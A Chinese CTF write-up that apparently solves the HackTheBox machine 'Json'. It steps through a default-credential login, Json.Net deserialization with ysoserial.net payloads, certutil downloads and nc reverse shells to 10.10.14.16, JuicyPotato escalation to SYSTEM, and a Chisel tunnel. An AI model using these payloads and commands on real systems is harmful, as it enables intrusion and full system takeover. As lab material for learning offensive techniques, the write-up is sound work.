Json是一个中等难度的靶机，知识点涉及弱口令漏洞、JavaScript反混淆、Json反序列化、烂土豆提权、FileZilla密码替换等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2022-02-16
上午9.00.03](https://image.3001.net/images/20220322/1647935732_623980f47cd9e83c3de37.png!small)  
 _通关思维导图_  
![Json](https://image.3001.net/images/20220322/1647935734_623980f65a05c183f620e.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.158 -oA nmap_Json
    

![截屏2022-02-16
上午10.26.25](https://image.3001.net/images/20220322/1647935735_623980f7de0eadf51689c.png!small)  
扫描结果显示目标开放了21、80、135、445、5985、47001等端口

#### 80端口

访问站点首先会跳转进入至管理界面，随后重定向至登陆界面  
![截屏2022-03-02
下午3.43.37](https://image.3001.net/images/20220322/1647935738_623980fa9b8be60aef2fb.png!small)  
使用 Burp Suite 查看请求包进行分析，请求的 js 文件大多响应 404  
![截屏2022-03-02
下午3.48.20](https://image.3001.net/images/20220322/1647935740_623980fc46df6ee7e06e4.png!small)  
使用 Burp Suite 拦截请求包，在此之前请清除浏览器当中的页面缓存，否则请求不会经过 Burp Suite  
![截屏2022-03-02
下午3.51.47](https://image.3001.net/images/20220322/1647935741_623980fdc7b2d88d37c51.png!small)  
这确实是一个控制面板，且不需要进行身份验证。放包后会跳转至登陆界面

### JavaScript反混淆

请求文件`/js/app.min.js`返回混淆代码  
![截屏2022-03-02
下午4.15.05](https://image.3001.net/images/20220322/1647935743_623980ff3d05bdcacee0a.png!small)  
放入网站中进行反混淆操作，手工替换后拿到原 js 代码  
 **网站地址：http://jsnice.org/**  
![截屏2022-03-02
下午4.18.58](https://image.3001.net/images/20220322/1647935744_62398100d4ecfa27fc320.png!small)

    
    
    'use strict';
    angular["module"]("json", ["ngCookies"])["controller"]("loginController", ["$http", "$scope", "$cookies", function(elem, data, isSlidingUp) {
      data["credentials"] = {
        UserName : "",
        Password : ""
      };
      data["error"] = {
        message : _0xd18f[18],
        show : false
      };
      var _0x30f6x4 = isSlidingUp["get"]("OAuth2");
      if (_0x30f6x4) {
        window["location"]["href"] = "index.html";
      }
      /**
       * @return {undefined}
       */
      data["login"] = function() {
        elem["post"]("/api/token", data["credentials"])["then"](function(canCreateDiscussions) {
          window["location"]["href"] = "index.html";
        }, function(body) {
          data["error"]["message"] = "Invalid Credentials.";
          /** @type {boolean} */
          data["error"]["show"] = true;
          console["log"](body);
        });
      };
    }])["controller"]("principalController", ["$http", "$scope"], "$cookies", function($http, isSlidingUp, canCreateDiscussions) {
      var _0x30f6x4 = canCreateDiscussions["get"]("OAuth2");
      if (_0x30f6x4) {
        $http["get"]("/api/Account/", {
          headers : {
            "Bearer" : _0x30f6x4
          }
        })["then"](function(canCreateDiscussions) {
          isSlidingUp["UserName"] = canCreateDiscussions["data"]["Name"];
        }, function(canCreateDiscussions) {
          canCreateDiscussions["remove"]("OAuth2");
          window["location"]["href"] = "login.html";
        });
      } else {
        window["location"]["href"] = "login.html";
      }
    }]);  
    

代码中将`windows.location.href`设置为`login.html`，同时基于 OAuth2 调用`/api/account`

### 弱口令

使用异常简单的`admin/admin`能够直接登陆目标站点  
![截屏2022-03-02
下午4.35.40](https://image.3001.net/images/20220322/1647935748_62398104e2fb93252cd63.png!small)  
与此同时使用 Burp Suite 抓取登陆请求包，它向`/api/token`发送明文的账号密码，目标则返回 OAuth2 的 Cookie 值  
![截屏2022-03-02
下午4.38.32](https://image.3001.net/images/20220322/1647935750_623981067335366c4fc33.png!small)  
Cookie 值通过 base64 解码后登陆用户的个人信息

    
    
    echo 'eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=' | base64 -d
    

![截屏2022-03-02
下午4.41.20](https://image.3001.net/images/20220322/1647935751_623981076cd885b010961.png!small)

## 0x02 上线[userpool]

### API模糊测试

![截屏2022-03-02
下午4.59.27](https://image.3001.net/images/20220322/1647935752_623981087aca718d3ad2d.png!small)  
在 http 请求包中存在两个参数引人注目，分别是 Cookie 和 Bearer

#### Cookie

首先在 Cookie 中进行修改，结果未发生变化  
![截屏2022-03-02
下午5.00.57](https://image.3001.net/images/20220322/1647935753_62398109667dea57658cc.png!small)

#### Bearer

在 Bearer 中进行修改，返回数据包发生变化说明可能存在反序列化漏洞  
![截屏2022-03-02
下午5.01.16](https://image.3001.net/images/20220322/1647935754_6239810a87e34ddfd3f63.png!small)

### 反序列化

在 Bearer 中提供错误输入时，服务器返回`Json.Net Object`，使用`YSoSerial.Net`工具可用于 .Net 反序列化攻击  
 **工具下载地址：https://github.com/pwntester/ysoserial.net**

    
    
    ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping 10.10.14.16" -o base64 
    

成功生成序列化 POC 并替换请求头中的 Bearer

    
    
    ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgMTAuMTAuMTQuMTYnXQ0KICAgIH0sDQogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQ0KfQ==
    

同时监听 icmp 数据包并发送带有 POC 的请求

    
    
    tcpdump -i tun0 icmp
    

![截屏2022-03-03
下午2.58.37](https://image.3001.net/images/20220322/1647935755_6239810bbe4895af58bed.png!small)  
成功在本地接收到 icmp 数据包，说明命令执行成功  
![截屏2022-03-03
下午2.58.49](https://image.3001.net/images/20220322/1647935757_6239810d5e70f933e7346.png!small)  
使用`ysoserial.exe`序列化命令：通过 http 服务下载 nc

    
    
    ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://10.10.14.16/nc64.exe c:/windows/System32/spool/drivers/color/nc64.exe" -o base64 
    

生成如下 base64 编码

    
    
    ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIGNlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzEwLjEwLjE0LjE2L25jNjQuZXhlIGM6L3dpbmRvd3MvU3lzdGVtMzIvc3Bvb2wvZHJpdmVycy9jb2xvci9uYzY0LmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
    

监听 443 端口

    
    
    nc -nvlp 443
    

开启 http 服务

    
    
    python3 -m http.server 80
    

![截屏2022-03-03
下午4.13.39](https://image.3001.net/images/20220322/1647935758_6239810e56971cd44e779.png!small)

使用`ysoserial.exe`序列化命令：执行反弹shell

    
    
    ysoserial.exe -g ObjectDataProvider -f Json.Net -c "c:/windows/System32/spool/drivers/color/nc64.exe -e cmd.exe 10.10.14.16 443" -o base64
    

生成如下 base64 编码

    
    
    ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIGM6L3dpbmRvd3MvU3lzdGVtMzIvc3Bvb2wvZHJpdmVycy9jb2xvci9uYzY0LmV4ZSAtZSBjbWQuZXhlIDEwLjEwLjE0LjE2IDQ0MyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
    

![截屏2022-03-03
下午4.16.27](https://image.3001.net/images/20220322/1647935759_6239810f5cf1179a6a4da.png!small)  
成功拿到反弹shell，在当前用户桌面上寻找第一个flag

    
    
    dir c:\Users\userpool\Desktop
    type c:\Users\userpool\Desktop\user.txt
    

![截屏2022-03-03
下午4.24.44](https://image.3001.net/images/20220322/1647935760_623981107e5a43735a659.png!small)  
成功拿到第一个flag

## 0x03 权限提升[system]

### 内核提权

#### 信息收集

查看系统信息

    
    
    systeminfo
    

![截屏2022-03-03
下午4.30.03](https://image.3001.net/images/20220322/1647935761_62398111adcb7cd265acc.png!small)  
系统版本为 Windows Server 2012，使用 Windows-Exploit-Suggester 查找相关内核漏洞

    
    
    python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt
    

![截屏2022-03-03
下午4.38.13](https://image.3001.net/images/20220322/1647935763_623981133e6c22b3ea049.png!small)  
结果显示可用多个漏洞进行提权，查看用户权限发现`SeImpersonatePrivilege`已开启，这就意味着我们可使用烂土豆进行提权

    
    
    whoami /priv
    

![截屏2022-03-03
下午4.31.40](https://image.3001.net/images/20220322/1647935765_623981155a668cbd257f8.png!small)

#### 烂土豆利用

编写 bat 脚本`rev.bat`

    
    
    \windows\system32\spool\drivers\color\nc64.exe -e cmd.exe 10.10.14.16 4444
    

使用 http 服务将其上传至`c:/windows/System32/spool/drivers/color/`目录当中

    
    
    certutil -urlcache -split -f http://10.10.14.16/rev.bat c:/windows/System32/spool/drivers/color/rev.bat
    

![截屏2022-03-03
下午4.54.13](https://image.3001.net/images/20220322/1647935766_6239811674f37d545d98d.png!small)  
在本地建立 smb 共享

    
    
    python3 smbserver.py -smb2support mac -username mac -password mac ~/hackthebox/Machines/Json
    

使用 smb 共享制定一个 CLSID 运行烂土豆

    
    
    net use \\10.10.14.16\mac /u:mac mac
    \\10.10.14.16\mac\JuicyPotato.exe -t * -p \windows\system32\spool\drivers\color\rev.bat -l 9001 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
    

在本地监听 4444 端口

    
    
    nc -nvlp 4444
    

![截屏2022-03-03
下午7.59.13](https://image.3001.net/images/20220322/1647935768_62398118407df70f7597b.png!small)  
但是无法运行，查其原因貌似是未连接 smb 服务，为什么会导致这个问题产生呢？发现原来是 smbserver 导致 smb
服务开启后靶机连接出错，换一个版本后即可连接成功  
![截屏2022-03-03
下午9.34.55](https://image.3001.net/images/20220322/1647935769_623981198c52dc8deae6d.png!small)

由于 smbserver 出现了小毛病，我们还是切换至 http 服务来完成传输

    
    
    certutil -urlcache -split -f http://10.10.14.16/JuicyPotato.exe c:/windows/System32/spool/drivers/color/JuicyPotato.exe
    

![截屏2022-03-03
下午8.02.47](https://image.3001.net/images/20220322/1647935770_6239811a973a3e945bcbf.png!small)

运行烂土豆尝试获取权限

    
    
    c:/windows/System32/spool/drivers/color/JuicyPotato.exe -t * -p \windows\system32\spool\drivers\color\rev.bat -l 9001 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
    

![截屏2022-03-03
下午8.04.18](https://image.3001.net/images/20220322/1647935771_6239811be1cb3c057fd8f.png!small)  
成功拿到系统权限  
![截屏2022-03-03
下午8.04.29](https://image.3001.net/images/20220322/1647935773_6239811d10e4ecc6a3222.png!small)  
在管理员 superadmin 桌面上寻找第二个flag

    
    
    dir c:\Users\superadmin\Desktop
    type c:\Users\superadmin\Desktop\root.txt
    

![截屏2022-03-03
下午9.11.12](https://image.3001.net/images/20220322/1647935774_6239811e3e06245087c65.png!small)  
成功拿到第二个flag

### FileZilla获取flag

#### 发现FileZilla进程

查看本地开放端口

    
    
    netstat -ano
    

![截屏2022-03-03
下午9.22.19](https://image.3001.net/images/20220322/1647935775_6239811f8a51c4271b081.png!small)  
存在之前 nmap 未探测的端口：21，查看对应进程发现这是 FileZilla 应用

    
    
    tasklist | findstr 632
    

![截屏2022-03-03
下午9.25.12](https://image.3001.net/images/20220322/1647935776_62398120c407f87273be1.png!small)  
查看程序对应的配置文件，其中包含哈希值和管理端口（14147），尝试哈希破解但是无果

    
    
    cd "c:\PROGRA~2\FileZilla Server"
    type "FileZilla Server.xml"
    

![截屏2022-03-03
下午9.28.52](https://image.3001.net/images/20220322/1647935777_62398121c176a374dffdc.png!small)

#### 搭建隧道

为了方便与靶机进行交互，我们可以使用 Chisel 建立隧道。首先将其上传至靶机当中

    
    
    copy \\10.10.14.16\mac\chisel.exe \windows\system32\spool\drivers\color\chisel.exe
    

![截屏2022-03-03
下午10.15.56](https://image.3001.net/images/20220322/1647935779_62398123410bf4c6b7b70.png!small)  
在本地开启反向代理端口8000

    
    
    ./chisel server -p 8000 --reverse
    

![截屏2022-03-03
下午10.19.37](https://image.3001.net/images/20220322/1647935780_62398124a8ca4095bfd0b.png!small)  
在靶机上连接本地8000端口

    
    
    chisel.exe client 10.10.14.16:8000 R:223:localhost:14147
    

![截屏2022-03-03
下午10.23.56](https://image.3001.net/images/20220322/1647935781_623981258380278716334.png!small)  
在本地安装 FileZilla Server，以下是安装过程  
 **下载地址：https://filezilla-project.org/download.php?type=server**

    
    
    sudo dpkg -i FileZilla_Server_1.3.0_x86_64-linux-gnu.deb
    

![截屏2022-03-03
下午10.42.15](https://image.3001.net/images/20220322/1647935782_623981267ee0333ffa934.png!small)  
但是其中并没有配置地址和端口的界面，切换至 Windows 下本机又无法连接 v\p\n，真是个头疼的问题  
![截屏2022-03-03
下午10.52.11](https://image.3001.net/images/20220322/1647935783_62398127965cfde538bdb.png!small)

**总结：通过弱口令可直接进入网站后台，查看http请求头信息发现Bearer标头存在反序列化漏洞，使用反序列化工具ysoserial序列化payload，执行反弹shell拿到用户权限。在靶机中检查系统信息，其中存在许多提权漏洞，最终选择烂土豆提升至系统权限。0xdf大神还介绍了其他两种获取flag的方式，分别是FileZill和Sync2Ftp，我这边只测试了第一种情况，但是遇到v\p\n占用问题导致实验无法继续，想了解的朋友可以关注他的博客。**

